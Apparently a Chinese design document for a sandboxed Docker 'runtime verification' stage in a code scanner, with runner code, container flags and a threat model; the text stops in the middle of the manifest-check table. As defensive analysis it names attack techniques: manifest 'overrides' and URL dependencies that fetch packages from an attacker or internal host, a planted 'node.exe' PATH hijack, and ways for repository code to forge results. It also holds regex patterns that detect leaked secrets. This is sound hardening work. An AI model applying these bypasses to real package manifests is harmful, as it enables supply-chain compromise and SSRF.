# 运行时复现(Runtime Verification)设计稿

状态:v5 设计,已实现(0.7.0);离线测试 58 条通过,端到端未验证(Docker daemon 未运行、镜像 digest 仍是占位符)。实现记录见 §14。

**v4 变更**:依赖安装从「不做」改为 **v1 必需**(用户要求:仓库需要什么依赖就装什么)。
**v5 变更(安全评审后)**:install **默认 offline**(`--network=none` + `npm ci --offline`,读 host npm 缓存),联网改为显式 `runtimeVerifyOnline=true`——因为 manifest 检查被证实可绕过(URL 规格 / `overrides` / v1 lockfile),字符串检查不是网络控制。另修:`REJECT` 不回显内容、volume 树发布到根、成功标记 + fingerprint、Docker 合法卷名、生命周期统一全拒、源码物理隔离到 manifest 暂存目录。

**修订记录**

- v1 → v2:删除通用命令 runner、`crash`/`slower-than`/`timeout` 三种 oracle 模式、两个配置项、顶层四态 status;新增 host 侧不变量。
- v2 → v3(本轮评审后):
  - **判定从「脚本打印标记」改为「脚本返回值 + 固定规则计算断言」**(v3.2:计算位置在容器内 `assert.cjs`,主机只读布尔)。v2 的 `REPRO_OK` 由模型脚本打印,而同进程运行的仓库代码也能打印它——两个方向都能伪造。
  - `npmGuard` 复用改为独立检查(复用会把 knip/jscpd/madge/ast-grep 一并停用)。
  - host 侧编码/遍历/realpath 明确为 `world.run("node", ["-e", ...])` 片段(工作流脚本没有 `Buffer`/`btoa`/`fs`)。
  - 长度上限从字符改字节,并给出 base64 后总长预算。
  - §5 与 §6.4 的 `-v` / `--mount` 矛盾统一为 `--mount`。
  - 探测从「context 名是 default」改为「endpoint 是本地 npipe/unix」。
  - 脱敏改为在容器内对**完整输出**执行,再截断。
  - 新增镜像 digest 校验、tmpfs mode 固定、审计文件固定命名、report-before-repro。

## 1. 目标

当前复核是**确定性文本核对**(`groundFinding`):文件存在、行号在范围内、引文在引用行附近。它证明「引用的代码确实存在」。

本设计增加第二阶段:在隔离容器里**真跑仓库代码**,拿到一条运行期观察记录,并在主机侧按固定规则判定它是否支持该发现。

它给出的最强形式是:

> 把真实输入喂进仓库里的真实模块,观察到它抛了预期的错 / 返回了与期望不同的值 / 耗时随规模增长超过阈值。

**依赖安装是 v1 的必需部分**(§5.2):不装依赖,绝大部分真实模块根本 `require` 不到外部包,复现就退化成「复制函数重测」,证明不了仓库的真实行为。

**它不证明的(两条,都必须写在报告里)**:

1. **这个行为在业务上是不是问题** —— 那是评审员的判断。
2. **观察记录本身无法对抗恶意仓库** —— 脚本必须 `require` 仓库代码,两者同一个进程;仓库代码能干扰测量、序列化和输出。所以 `reproduced` 的含义严格限定为「脚本返回了符合断言的数据」,**不是「问题已被独立证明」**。详见 §4.0 与 §12.1。

因此本功能的产出是**证据强化**,不是**自动裁决**。它永不用于自动 dismiss 或自动降级任何发现。

## 2. 与现有安全模型的关系

现有实现是**全链路 fail-closed**,核心承诺是「不执行仓库代码」。本功能与这条承诺直接冲突,无法调和。

所以目标不是「保持不执行」,而是:

1. **默认关闭**,用户显式打开才执行
2. 执行只发生在容器里,**工作区永不被写入**(扫描自身的 `.code-scan/` 除外),容器外不主动执行仓库代码
3. 每一项隔离措施对应一个具体威胁,可审计
4. **判定不由被执行的代码自己宣布**(§4)

### 2.1 明确的威胁模型分层

| 层 | 是否信任 | 处置 |
|---|---|---|
| 用户的 `repos` 列表 | 信任 | 边界输入 |
| 仓库内容(源码、`package.json`、`.npmrc`、文件名、符号链接) | **不信任** | 容器隔离 + 挂载前检查 |
| 模型产出的 `ReproSpec` | **不信任** | 主机侧校验 + 容器内 `assert.cjs` 用原始数据计算断言 |
| 容器内运行的代码 | **不信任** | §5 全套 flag |
| **从 npm registry 下载的依赖内容** | **不信任** | install 容器隔离 + 五项 manifest 检查 + `ignore_scripts` + 只复制 manifest(§5.2) |

**v2 的错误是把「模型可能写错断言」当成唯一风险,漏掉了「仓库代码与模型脚本同进程」这一层。**

### 2.2 一条诚实的边界说明

现有代码用裸命令名调用 `node`、`git`、`npx`,由 host 的 PATH 解析。Windows 的 `CreateProcess` 先查当前目录,而工作流 cwd 就是被扫工作区。因此**恶意仓库可以在工作区根放一个 `node.exe` / `git.exe`,在任何检查之前被执行**。

这是**既有实现的问题,不是本设计引入的**,但本设计不得掩盖它。处置:

- 本设计对 `docker` 做了独立顶替检查(§6.2)
- `node`/`git` 的绝对路径执行作为**独立后续项**,不混入本次范围
- 文档与报告不得宣称「host 永不被执行仓库代码」;准确表述是「**工作区永不被写入;容器外不主动执行仓库代码**」

## 3. 执行位置

```
host (ZCode 工作流)
  └─ world.run("docker", [...])        ← 命令名是编译期字面量
       └─ 容器:唯一的主动执行点
            ├─ /src   仓库(只读)
            ├─ /work  tmpfs(唯一可写)
            └─ 无网络、非 root、capability 全丢
```

选 Docker:本机已有 CLI 29.4.1;WSL 隔离更弱且 Windows-only;Podman 不在机器上。

**当前本机 daemon 未运行**,功能在探测阶段跳过。这是最常见路径,必须优雅(§8)。

### 3.1 不做的隔离承诺

- 内核漏洞导致的容器逃逸**不在防护范围**。容器隔离弱于 Devin 的 VM(共享内核),文档不得宣称等价。
- 不挂 `/var/run/docker.sock`。
- 不 build 仓库自带的 Dockerfile。
- **不执行依赖包的 `postinstall`/`prepare`**。`ignore_scripts` 是必选项,不是可选项;因此依赖 native 编译的包(esbuild/sharp/puppeteer)可能不可用。
- **不用仓库自带的 `node_modules`**。即使它存在,install 也必在容器内重做——host 的 `node_modules` 可能被投毒。

## 4. 判定

### 4.0 为什么判定不能做到「不可伪造」——先说清楚

v2 的 `REPRO_OK` 标记有两个致命问题:脚本要求 import 真实仓库代码 → 那段代码与脚本同进程 → 它能 `console.log("REPRO_OK")` 伪造 `reproduced`,也能 `process.exit(0)` 伪造 `notReproduced`。`includes("REPRO_OK")` 还是子串匹配,`NOT_REPRO_OK` 也命中。

v3 把判定改成「脚本返回数据、固定规则计算断言」。这挡掉了无条件打印标记和裸退出码伪造,但**没有**、也**不可能**做到不可伪造:

- 仓库代码可以 `module.exports` 一个假的实现,让 `run()` 返回任意数值
- 仓库代码可以 monkey-patch `JSON.stringify`
- **仓库代码可以 `process.on('exit', ...)` 在进程退出时覆写 `/work/result.json`**(判定数据文件)
- 时序测量发生在被污染的进程内,精度和公正性都无法保证

**根因**:脚本必须 import 仓库代码才有意义(否则只是复制函数重测,证明不了仓库里的真实行为),而同进程 = 共享一切 = 没有可信通道。

任何声称「加了 X 机制就不可伪造」的方案都是错的。所以本设计**不声称**不可伪造,而是:

1. 把伪造**门槛**提高到「必须主动写对抗代码」,而不是「一句 console.log」
2. 让伪造**留下痕迹**(脚本全文、原始输出进审计目录)
3. 在**所有展示位置**标注这是脚本自报,不是独立验证
4. **永不**用它自动 dismiss 或自动降级发现

下面 §4.1–§4.4 描述具体机制;它能挡住的是**混淆与疏忽**,不是**恶意**。这个边界必须写进产品文案。

### 4.1 数据契约

判定所需的数值由**脚本返回**,不由 stdout 宣布;断言由**容器内固定的 `assert.cjs`** 计算,主机只读布尔结果(§4.3)。

```ts
/** 审查员给出的一条可执行复现。 */
interface ReproSpec {
  /**
   * 一段 CommonJS 脚本,必须 `module.exports = { run }`。
   * run() 是 async 或 sync 均可,返回一个普通对象(见 assertion 需要的字段)。
   *
   * **导入仓库代码的唯一正确方式**:
   *   const { createRequire } = require('module');
   *   const repoRequire = createRequire('/src/package.json');
   *   const target = repoRequire('./src/foo.js');      // 仓库源码
   *   const express = repoRequire('express');          // 仓库的依赖
   * 裸 `require("./src/foo.js")` 会从 /work 解析而失败——脚本位于 /work,不在仓库内。
   *
   * 限制:不得写文件、不得联网、不得读环境变量、不得改 process 全局。
   */
  script: string;
  /** 判定规则;由容器内固定的 assert.cjs 用 run() 的原始返回值计算(不读 stdout、不脱敏)。 */
  assertion: ReproAssertion;
  /** 一句话:这段脚本证明了什么。 */
  proves: string;
}

/** 主机侧可计算的断言。三种足够覆盖质量与性能两个维度。 */
type ReproAssertion =
  /** 断言「调用会抛错,且错误信息匹配」。run() 返回 { threw, message }。 */
  | { kind: "throws"; match: string }
  /** 断言「返回值不等于期望」。run() 返回 { actual }。 */
  | { kind: "not-equals"; expected: string }
  /** 断言「2n 耗时超过 n 的 threshold 倍」。run() 返回 { t1Ms, t2Ms }。 */
  | { kind: "ratio-greater"; threshold: number };
```

主机侧判定:

判定式由**容器内固定 `assert.cjs`** 用原始数据计算,结果随 `result.json` 的 `verdict` 字段带出;主机只读这个布尔值。下表是同一份规则的说明:

| kind | 判定式 | 说明 |
|---|---|---|
| `throws` | `data.threw === true && String(data.message).includes(match)` | `match` 必填且非空 |
| `not-equals` | `String(data.actual) !== expected` | 不等即复现 |
| `ratio-greater` | `Number(data.t2Ms) / Number(data.t1Ms) > threshold && Number(data.t1Ms) >= 50` | **`t1Ms >= 50` 是噪声地板**:小样本计时不足以支撑结论。注意 O(n²) 的 n→2n 比值从下方逼近 4,严格 `>` 4 常不成立,阈值应取 3 左右 |

**主机固定参数**:

- `threshold` 由模型给。**超出 `[RATIO_MIN, RATIO_MAX]` 即无效 spec(拒绝,不钳制)** —— 钳制会把一个明显写错的阈值静默改成一个"看起来合理"的值,掩盖模型错误。下限 2.5、上限 100 见 §9。
- `t1Ms >= 50` 地板由主机固定,不可由模型改;低于地板即判**无效 spec**(不是 `notReproduced`)。
- `match` 空串 → 无效 spec(消除 v2 里 `match: ""` 恒真的漏洞)
- **断言在脱敏之前计算**(§4.3 runner 返回原始数据与判定结果,脱敏后的数据仅用于展示)。否则 `expected`/`match` 里含 token 时,脱敏后的值与原值不等,判定会两向出错。

### 4.2 为什么这样能挡住两层攻击

| 攻击 | v2 结果 | v3.1 结果 |
|---|---|---|
| 模型/仓库代码 `console.log("REPRO_OK")` | 假 `reproduced` | **无效**:判定不读 stdout,只读 `/work/result.json` |
| 仓库代码注册 exit handler 往 stdout 追加伪造 JSON | 假 `reproduced`(取最后一行) | **无效**:判定不读 stdout |
| 仓库代码注册 exit handler 覆写 `/work/result.json` | — | **仍可伪造**(§12.6),但审计目录留脚本全文 |
| 仓库代码顶层 `process.exit(0)` | 假 `notReproduced` | **不决定判定**:退出码只用于区分「没跑成」 |
| 模型写错阈值(如 `ratio > 0.5`) | 假 `reproduced` | **越界即拒绝 spec**(不钳制),见 §4.1 |
| 模型写小样本(如 `n=3`) | 噪声导致的随机结论 | `t1Ms >= 50` 地板拒绝 |
| 模型返回伪造数值、不调用仓库代码 | 假 `reproduced` | **仍可能**(§12.1):这是「证据强化」而非「独立验证」的边界 |

### 4.3 固定 runner(不经过 shell)

runner 是一段**编译期固定**的 Node 源码,作为容器命令 `node -e <RUNNER>` 执行(位置见 §5:在镜像名**之后**)。它不读 shell、不做字符串拼接。

```js
// RUNNER:固定源码,不含任何模型输出。作为单个 argv 元素传给 docker,node 的 -e 执行。
const fs = require('fs');

function redact(s) {
  return String(s)
    .replace(/([a-zA-Z][a-zA-Z0-9+.-]*:\/\/)[^\s/:@]+:[^\s/@]+@/g, '$1[redacted]@')
    .replace(/(AKIA|ASIA)[0-9A-Z]{16}/g, '[redacted]')
    .replace(/\b(ghp_|gho_|ghu_|ghs_|ghr_|glpat-|xox[bpar]-|sk-)[A-Za-z0-9_-]{10,}/g, '[redacted]')
    .replace(/(_authToken|_auth|password|secret|token)\s*=\s*\S+/gi, '$1=[redacted]')
    .replace(/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g, '[redacted]');
}

/** 递归脱敏:判定数据本身也可能带凭据(如错误信息里回显 token)。 */
function redactDeep(v, depth) {
  if (depth > 6) { return '[depth]'; }
  if (typeof v === 'string') { return redact(v); }
  if (Array.isArray(v)) { return v.map((x) => redactDeep(x, depth + 1)); }
  if (v && typeof v === 'object') {
    const o = {};
    for (const k of Object.keys(v)) { o[k] = redactDeep(v[k], depth + 1); }
    return o;
  }
  return v;
}

// 固定断言实现:判定在容器内用【原始】数据算(不脱敏、不截断),结果随 result.json 带出。
// 主机与容器共用这一份规则,避免"先脱敏再判定"导致含 token 的断言两向出错。
const ASSERT_SRC = [
  "const A = __ASSERTION__;",
  "module.exports = (d) => {",
  "  if (!A || typeof A.kind !== 'string') { return null; }",
  "  if (A.kind === 'throws') {",
  "    if (typeof A.match !== 'string' || A.match.length === 0) { return null; }",
  "    return d.threw === true && String(d.message).includes(A.match);",
  "  }",
  "  if (A.kind === 'not-equals') {",
  "    if (typeof A.expected !== 'string') { return null; }",
  "    return String(d.actual) !== A.expected;",
  "  }",
  "  if (A.kind === 'ratio-greater') {",
  "    const t1 = Number(d.t1Ms), t2 = Number(d.t2Ms), th = Number(A.threshold);",
  "    if (!isFinite(t1) || !isFinite(t2) || !isFinite(th)) { return null; }",
  "    if (th < 2.5 || th > 100) { return null; }",
  "    if (t1 < 50) { return null; }",
  "    return t2 / t1 > th;",
  "  }",
  "  return null;",
  "};",
].join('\n');

function emit(o) { process.stdout.write('@@RUNNER@@' + JSON.stringify(o) + '\n'); }

// harness 由 runner 写出,内容固定:它 require impl,调用 run(),把返回值交给 runner。
// 关键:harness 不写 stdout,而是把结果写到固定文件;runner 读文件。
// 这样仓库代码往 stdout 写什么都不影响判定(它无法阻止 runner 读文件)。
const HARNESS_SRC = [
  "const fs = require('fs');",
  "const RESULT = '/work/result.json';",
  "const write = (o) => { try { fs.writeFileSync(RESULT, JSON.stringify(o)); } catch (e) { } };",
  "let mod;",
  "try { mod = require('/work/impl.cjs'); }",
  "catch (e) { write({ stage: 'load', error: String(e && e.message || e) }); process.exit(0); }",
  "if (!mod || typeof mod.run !== 'function') { write({ stage: 'contract', error: 'module.exports.run missing' }); process.exit(0); }",
  "(async () => {",
  "  try {",
  "    const data = await mod.run();",
  "    if (data === null || typeof data !== 'object') {",
  "      write({ stage: 'contract', error: 'run() must return an object, got ' + typeof data });",
  "      process.exit(0);",
  "    }",
  "    let safe;",
  "    try { safe = JSON.parse(JSON.stringify(data)); }",
  "    catch (e) { write({ stage: 'serialize', error: String(e && e.message || e) }); process.exit(0); }",
  "    // verdict 用原始对象 data 计算(不是 safe,也不脱敏)",
  "    let verdict = null;",
  "    try { verdict = require('/work/assert.cjs')(data); } catch (e) { verdict = null; }",
  "    write({ stage: 'done', data: safe, verdict });",
  "  } catch (e) { write({ stage: 'run', error: String(e && e.message || e) }); }",
  "})();",
].join('\n');

try {
  const spec = JSON.parse(Buffer.from(process.env.REPRO_SPEC_B64 || '', 'base64').toString('utf8'));
  if (typeof spec.script !== 'string' || spec.script.length === 0) {
    emit({ phase: 'spec', error: 'script missing' });
  } else {
    fs.writeFileSync('/work/impl.cjs', spec.script);
    fs.writeFileSync('/work/harness.cjs', HARNESS_SRC);
    // 断言实现由 runner 固定写出,主机与容器的判定规则只有这一份
    // 用函数形式做替换:字符串形式的 replace 会把 $& / $$ / $` / $' 当替换模式,
    // 断言里含这些序列时(如 expected: "a$&b")会静默损坏,含 $' 还会引入换行导致语法错。
    fs.writeFileSync('/work/assert.cjs', ASSERT_SRC.replace('__ASSERTION__', () => JSON.stringify(spec.assertion || null)));
    const { spawnSync } = require('child_process');
    // 模块解析:脚本在 /work,harness 在 /work,CommonJS 会从 /work 逐级向上找
    // node_modules,永远够不到 /src/node_modules。所以在 harness 开头注入两个路径:
    //   NODE_PATH=/src/node_modules        —— 覆盖 bare specifier
    //   并把 /src 加进 module.paths        —— 覆盖 harness 自身
    // 更可靠的做法是 harness 顶部用 createRequire('/src/package.json'),见 §4.3 的
    // 脚本约定:脚本必须用 createRequire('/src/package.json') 而不是裸 require,
    // 才能解析到仓库的依赖。
    const r = spawnSync(process.execPath, ['/work/harness.cjs'], {
      cwd: '/src',
      encoding: 'utf8',
      timeout: 52000,
      maxBuffer: 8 * 1024 * 1024,
      // 隔离子进程的环境:不让子进程继承 REPRO_SPEC_B64
      env: {
        PATH: process.env.PATH,
        HOME: '/tmp',
        TMPDIR: '/tmp',
        // 让脚本里的裸 require 也能解析到仓库依赖;脚本仍应优先用 createRequire
        NODE_PATH: '/src/node_modules',
      },
    });
    // 判定数据只从固定文件读;stdout 完全不参与判定
    let payload = null;
    try {
      payload = JSON.parse(fs.readFileSync('/work/result.json', 'utf8'));
    } catch (e) {
      payload = null;
    }
    // verdict 在容器内用【原始】数据计算,脱敏只作用于展示字段。
    // 否则 expected/match 里含 token 时,脱敏后的值与原值不等,判定两向出错。
    emit({
      phase: 'run',
      status: typeof r.status === 'number' ? r.status : -1,
      signal: r.signal || '',
      timedOut: !!(r.error && /ETIMEDOUT/i.test(String(r.error.message || r.error))),
      payload: payload === null ? null : redactDeep(payload, 0),
      // verdict:true/false = 有效判定;null = 无效 spec 或数据不合规(→ unavailable)
      verdict: payload && typeof payload.verdict === 'boolean' ? payload.verdict : null,
      stdoutTail: redact(String(r.stdout || '')).slice(-1500),
      stderrTail: redact(String(r.stderr || '')).slice(-1500),
    });
  }
} catch (e) {
  emit({ phase: 'runner', error: redact(String((e && e.message) || e)) });
}
```

**关键点**:

1. **判定数据走固定文件 `/work/result.json`,不走 stdout**。这是 v3.1 的核心修正:v3 里「取最后一行 `__REPRO__`」可被仓库代码注册的 `process.on('exit')` 处理器在 harness 之后追加一行伪造数据击穿。改成文件后,仓库代码要伪造必须**在 harness 写文件之后覆写同一个文件**——而 harness 是最后写它的代码(exit handler 可以做到,但门槛显著提高,且 §12.1 已声明不做不可伪造承诺)。
2. **子进程环境被裁剪**:`REPRO_SPEC_B64` 不传给子进程,减少一个信息面。
3. **`redactDeep` 覆盖判定数据本身**。v3 只脱敏了 stdout/stderr 尾部,`payload` 原样输出——仓库代码抛出的错误信息里可能含 token。
4. **`redact()` 在截断之前执行**,消除「token 跨 1500 字符边界时正则失配」。
5. **`cwd: '/src'`**:忠实还原仓库代码读到相对路径时的上下文。`/src` 只读,`chdir` 不写。
6. **无 shell**:`spawnSync(process.execPath, ['/work/harness.cjs'])`,argv 逐项传递。
7. **脚本经 base64 环境变量传入**,不落 host 磁盘。

### 4.4 结果分类

```ts
interface ReproResult {
  /**
   * reproduced    : harness 返回了判定数据,主机断言成立
   * notReproduced : harness 返回了判定数据,主机断言不成立
   * unavailable   : 脚本没能正常执行(加载失败、契约不符、抛错、超时、缺依赖)
   * error         : docker 层失败(镜像缺失、挂载失败、探测失败)
   */
  outcome: "reproduced" | "notReproduced" | "unavailable" | "error";
  /** docker 进程退出码;-1 表示没拿到。与脚本自身退出码是两个不同的值。 */
  dockerExitCode: number;
  /**
   * 容器内用【原始】数据算出的判定:true=断言成立,false=不成立,
   * null=无效 spec / 数据不合规 / 小样本 → 一律 unavailable,绝不当作 false。
   */
  verdict: boolean | null;
  /** harness 返回的 stage;用于定位失败阶段。 */
  stage: "spec" | "runner" | "run" | "load" | "contract" | "serialize" | "done" | "";
  /** 一句话结论(可含脱敏后的关键数据)。 */
  note: string;
  stdoutTail: string;
  stderrTail: string;
}
```

主机分类表(**按顺序匹配,先命中先返回**):

| # | 条件 | outcome | 说明 |
|---|---|---|---|
| 1 | 探测阶段判定不可用(§8) | `error` | 没跑成 |
| 2 | `world.run` 抛异常(超时/spawn 失败) | `error` | 没跑成;同时触发 §5.1 的清理 |
| 3 | `dockerExitCode` ∈ {125, 126, 127} | `error` | docker 失败 / 命令不可执行 / 找不到 |
| 4 | `dockerExitCode !== 0` 且无 runner JSON | `error` | 例如 daemon 断开 |
| 5 | runner JSON `phase ∈ {"spec","runner"}` | `unavailable` | runner 自己出错 |
| 6 | `payload === null` | `unavailable` | harness 没返回判定数据 |
| 7 | `payload.stage ∈ {"load","contract","serialize","run"}` | `unavailable` | 脚本加载失败/契约不符/返回值无法序列化/抛错 |
| 8 | `payload.stage === "done"` 且 `verdict === true` | `reproduced` | |
| 9 | `payload.stage === "done"` 且 `verdict === false` | `notReproduced` | |
| 10 | `payload.stage === "done"` 且 `verdict === null` | `unavailable` | 无效 spec(阈值越界/`match` 空/小样本)或 `run()` 返回值不合契约 |
| 11 | **其余一切**(未知 stage、缺字段、形状不符) | `unavailable` | **fail-closed 兜底**:没有匹配到规则的一律不判 `reproduced`/`notReproduced` |

**规则 3/4 与 5-9 的区别是 `dockerExitCode` 与脚本退出码分开存储。** v2 混用同一个 `status` 字段,会让 `process.exit(125)` 的脚本被误判成 docker 错误。

**`timedOut === true` → `unavailable`**。这里的 `timedOut` 是容器内 `spawnSync` 的 52s 超时(脚本跑太久),与规则 2 的 `world.run` 超时/spawn 失败不是同一件事——后者是环境故障,判 `error`。**规则 2/3/4 先于本条按表序匹配**,docker 层故障不会被误判成脚本超时。

### 4.5 为什么不改 `status`

`status` 保持 `"verified" | "unconfirmed"`(来自确定性文本核对),`ReproResult` 作为**并列字段**。

v1 稿的四态迁移涉及 4 个类型联合、`dedupeFindings`、两处构造、judge 排序与输入投影、global 评审投影、看板、统计、markdown 标签、返回文案,约 16 处代码点,且容易让 `reproduced` 在 `verified ? 0 : 1` 的排序里落到后面。

两个正交的值,展示时组合:

```
复核: 已验证 | 复现: 已复现
复核: 已验证 | 复现: 未复现   ← 重点看
复核: 已验证 | 复现: 未运行
复核: 待复核 | 复现: —
```

**`notReproduced` 的展示文案必须带限定语**:「脚本未观察到预期行为」,不是「该发现是假阳性」。理由见 §12.1。

## 5. 容器命令

每条 flag 对应一个具体威胁。**完整 argv 示例**(注意 `--mount` 而非 `-v`,理由见 §6.4):

```
world.run("docker", [
  "run", "--rm",
  "--name", "<CONTAINER_NAME>",
  "--network=none",
  "--read-only",
  "--tmpfs", "/work:rw,noexec,nosuid,nodev,mode=1777,size=64m",
  "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,mode=1777,size=32m",
  "--user", "65534:65534",
  "--cap-drop=ALL",
  "--security-opt", "no-new-privileges",
  "--pids-limit", "128",
  "--memory", "1g", "--memory-swap", "1g",
  "--cpus", "2",
  "--mount", "type=bind,source=<仓库绝对路径>,target=/src,readonly",
  // 依赖来自 install 阶段产物。volume 的【根】就是依赖树根(见 §5.2.5 的发布步骤),
  // 所以直接挂到 /src/node_modules,得到 /src/node_modules/express。
  "--mount", "type=volume,source=<DEPS_VOLUME>,target=/src/node_modules,readonly",
  "--workdir", "/src",
  "-e", "HOME=/tmp",
  "-e", "TMPDIR=/tmp",
  "-e", "REPRO_SPEC_B64=<base64>",
  "--entrypoint", "node",
  "<镜像名@sha256:digest>",
  "-e", "<RUNNER 源码>"
])
```

**注意 `-e` 出现两次且含义不同**:镜像名之前的 `-e` 是 docker 的环境变量 flag;镜像名之后的 `-e` 是传给 node 的参数。docker 的 run 解析器遇到第一个非 flag 参数(镜像名)后停止解析 flag,所以 `node -e <RUNNER>` 成立。这一点必须在实现里加测试断言(§11 #16)。

| 措施 | 挡什么 |
|---|---|
| `--network=none` | 外传、连内网、`host.docker.internal`、下载载荷 |
| `/work` 是 tmpfs 而非 host 挂载 | 仓库代码写文件落到 host |
| `/src:ro` | 仓库被改写,保住「工作区只读」 |
| `--read-only` | 容器内落盘 |
| `--user nobody` + `--cap-drop=ALL` + `no-new-privileges` | 提权 |
| `mode=1777` | uid 65534 无法写 tmpfs 导致每条都 `unavailable` |
| `--pids-limit` | fork 炸弹打死宿主 |
| `--memory` / `--cpus` | 资源耗尽 |
| 镜像按 digest 钉死 | 镜像被替换(探测阶段校验,§8) |
| `--rm` + 固定 `--name` + `finally` 里的 `docker rm -f` | 容器泄漏 |

### 5.1 容器名必须可盲删

`world.run` 超时或 spawn 失败时**不会返回任何输出**,所以无法从输出里拿容器 ID。

- 名字是确定性的:`code-scan-repro-<AUDIT_ID>-<序号>`。`AUDIT_ID` 是探测阶段 `mkdtemp` 得到目录名的随机后缀,**每次运行唯一**。
  - **不用 `run.id`**:facade 明确要求把 `run.id` 挡在 `world`/`files` 参数之外——它们是缓存键,`AmendWorkflow` 换新 id 会让每次调用都 miss 缓存。用 `AUDIT_ID` 既唯一又不污染缓存键。
  - 并行跑两个扫描时名字不冲突,`docker rm -f` 不会误杀对方的容器。
- `finally` 里**无条件**执行 `world.run("docker", ["rm", "-f", name])`,不管主调用成功与否。
- **不做**「运行前先 `docker rm -f` 同名容器」:名字已含唯一 `AUDIT_ID`,不存在同名;盲删反而在多进程下有误杀风险。上次异常退出的残留靠 `--rm` + 审计目录里的容器名清单人工清理,并记入 `notCovered`。

### 5.2 安装依赖:两段式容器

复现要能 `require("express")`,就必须装依赖。装依赖和跑仓库代码是两种信任级别——安装要解析外部包(可能联网),复现只跑已装好的东西——所以拆成两段容器:

```
┌─ Stage 1: install ──────────────────────────────────┐
│ 默认 --network=none + npm ci --offline(读 host 缓存)│
│ 依赖装进 named volume(每 repo+fingerprint 一个)     │
│ 只装不跑任何仓库脚本                                │
└──────────────────────┬──────────────────────────────┘
                       │ volume(只读挂到 /src/node_modules)
┌──────────────────────▼──────────────────────────────┐
│ Stage 2: repro(--network=none)                      │
│ /src:ro、/work:tmpfs、node_modules:ro from volume   │
│ 执行复现脚本                                        │
└─────────────────────────────────────────────────────┘
```

#### 5.2.0 网络:默认离线,联网是显式选择

**安全评审的核心结论:manifest/lockfile 的字符串检查不是网络控制。** 三条已验证的绕过:

1. **URL 规格**:`"dependencies": {"x": "https://10.0.0.5:8080/x.tgz"}` 不在 git/file 前缀黑名单里;lockfile 里 `resolved` 仍写 registry → arborist 认为该边不满足,`buildIdealTree` 阶段直接 `pacote.manifest("https://10.0.0.5:8080/x.tgz")`,**在 lockfile 校验之前**就发出 GET。
2. **`overrides`**:`{"overrides": {"ms@2.1.3": "https://attacker/ms.tgz"}}`,installer 根本不扫 `overrides`。
3. **lockfileVersion 1**:installer 只遍历 `lock.packages`(v2/v3);v1 的 `resolved` 在 `lock.dependencies` 下,完全不检查,而 npm 会自动把 v1 转 v3 并照用那些 URL。

`--registry` **不会**覆盖 lockfile 里的 `resolved`(只有默认 registry 的 host 会被改写)。

所以:manifest 检查是**纵深防御**,不是控制点。真正的控制是网络层。

| 模式 | 触发 | 隔离来自 |
|---|---|---|
| **offline(默认)** | 总是 | `--network=none` + `npm ci --offline`,依赖来自 host npm 缓存 |
| **online(opt-in)** | `runtimeVerifyOnline=true` | bridge + 全部 manifest 检查 + 报告里明确披露 |

**offline 的机制**:

- 挂载 host 的 npm 缓存根 `<home>/.npm`(**不是** `_cacache`)**只读**到 `/npm-cache`
  - npm 的 content store 是 `<cache>/_cacache`。挂内层会把 `npm_config_cache=/npm-cache` 指向一个不含 `_cacache` 的目录,npm 去找 `/npm-cache/_cacache` → 永远落空 → 每次 install 都 `ENOTCACHED`,默认路径从不工作(虽然 fail-closed)
- 设置 `npm_config_cache=/npm-cache` + `npm_config_offline=true`,执行 `npm ci --offline`
- 缓存里缺包 → `npm ci` 失败 → 该仓库全部 `unavailable`,note 写「**缓存缺包;如需联网安装,加 `runtimeVerifyOnline=true`**」

**代价与取舍**:offline 要求扫描前本机装过一次(缓存里有那些包)。这是有意的——联网安装的 SSRF 面无法用 manifest 检查关闭。用户要自动装,就显式开 `runtimeVerifyOnline=true`,并接受「安装容器可访问任意主机」这一事实,报告与 `notCovered` 都会写出来。

#### 5.2.1 install 容器的完整 flag

```
world.run("docker", [
  "run", "--rm",
  "--name", "<INSTALL_CONTAINER_NAME>",
  "--network", "<none|bridge>",                        // offline 默认 none
  "--read-only",
  "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,mode=1777,size=512m",
  "--user", "65534:65534",
  "--cap-drop=ALL",
  "--security-opt", "no-new-privileges",
  "--pids-limit", "256",
  "--memory", "2g", "--memory-swap", "2g",
  "--cpus", "2",
  "--mount", "type=bind,source=<MANIFEST_STAGE_DIR>,target=/src,readonly",
  "--mount", "type=volume,source=<DEPS_VOLUME>,target=/deps",
  "--mount", "type=bind,source=<NPM_CACHE_DIR>,target=/npm-cache,readonly",
  "--workdir", "/deps",
  "-e", "HOME=/tmp",
  "-e", "TMPDIR=/tmp",
  "-e", "DEPS_FINGERPRINT=<fingerprint>",
  "-e", "INSTALL_MODE=<offline|online>",
  "-e", "npm_config_userconfig=/tmp/npm-userconfig",
  "-e", "npm_config_globalconfig=/tmp/npm-globalconfig",
  "-e", "npm_config_registry=https://registry.npmjs.org/",
  "-e", "npm_config_ignore_scripts=true",
  "-e", "npm_config_audit=false",
  "-e", "npm_config_fund=false",
  "-e", "npm_config_update_notifier=false",
  "--entrypoint", "node",
  "<镜像@sha256:digest>",
  "-e", "<INSTALLER 源码>"
])
```

| 措施 | 挡什么 |
|---|---|
| `--network=none`(默认) | **全部出网**,包括 SSRF 与 `host.docker.internal` |
| `--user nobody --cap-drop=ALL --no-new-privileges` | 安装期提权(与 repro 同级) |
| `--read-only` + `/tmp` tmpfs | 往容器可写层持久化 |
| `--pids-limit` / `--memory` / `--cpus` | 恶意安装打爆宿主 |
| `--rm` + 固定名 | 泄漏 |
| manifest 暂存目录而非仓库 | **仓库源码在 install 容器里物理不可见** |
| `DEPS_FINGERPRINT` 显式传入 | 成功标记记录安装输入,复用才能校验 |

**`userconfig` 不是项目 `.npmrc` 的控制点**(见 §5.2.3):真正起作用的是暂存目录里没有 `.npmrc`,且 npm 的 `localPrefix` 是 `/deps/stage`(安装的 `cwd`),而 `/src` 是兄弟挂载、不是祖先,npm 不会向上找到仓库里的 `.npmrc`。

#### 5.2.2 manifest 检查(五项,纵深防御)

安装前在**主机侧**扫描(`MANIFEST_CHECK_CODE`),installer 里再执行一遍(防竞态)。任一命中 → 该仓库跳过安装,记 `unavailable`。

| # | 拒绝项 | 具体判定 |
|---|---|---|
